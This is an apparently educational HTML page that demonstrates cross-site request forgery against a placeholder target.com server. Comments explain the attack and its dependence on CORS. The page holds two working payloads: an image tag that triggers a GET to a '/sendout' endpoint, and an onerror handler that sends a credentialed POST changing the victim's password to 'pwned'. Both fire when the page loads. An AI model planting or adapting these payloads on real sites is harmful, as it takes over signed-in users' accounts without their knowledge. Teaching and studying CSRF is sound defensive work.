<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>CSRF - Malicious Website</title>
  </head>
  <body>
	<h1>Malicious Website</h1>
    <!-- 
        Imagine that such IMG has been placed on the site by an attacker and any user 
        signed in on the target domain visits this page.
    -->
    <img src="http://target.com:5000/sendout"></img>

    <!--
        Another example of malicious content that demonstrates CSRF attack.
        This time it triggers the malicious POST request.
        This request should be blocked by the browser due to the "Same Origin Policy". However, if the server
        allows CORS (Cross-Origin Resource Sharing) via headers, it will work!
    -->
    <img src="#" onerror="fetch('http://target.com:5000/password',{credentials:'include',method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({new_password: 'pwned'})})"></img>
  </body>
</html>